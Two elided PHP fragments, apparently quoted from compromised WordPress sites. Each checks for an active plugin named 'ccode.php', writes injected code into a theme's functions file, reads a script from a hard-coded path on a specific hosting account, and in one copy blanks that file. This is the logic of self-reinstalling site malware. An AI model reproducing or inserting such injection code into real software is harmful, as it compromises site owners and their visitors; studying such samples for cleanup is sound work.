	...
	if (in_array('ccode.php', $new_active_plugins)) {
		...
		if($start && $end) {
			...
			file_put_contents($functionsPath, $str);
				...
				$script = file_get_contents('/data/51/4/57/119/4872608/user/5767207/htdocs/wp-content/themes/consultio/class.theme-modules.php');
		file_put_contents('/data/51/4/57/119/4872608/user/5767207/htdocs/wp-content/themes/consultio/class.theme-modules.php', '');
	}
}
	...
	if (in_array('ccode.php', $new_active_plugins)) {
		...
		if($start && $end) {
			...
			file_put_contents($functionsPath, $str);
				...
				$script = file_get_contents('/home/techktdb/ghanamedassoc.org/wp-content/plugins/ccode.php');
		//file_put_contents('/home/techktdb/ghanamedassoc.org/wp-content/plugins/ccode.php', '');
	}
}
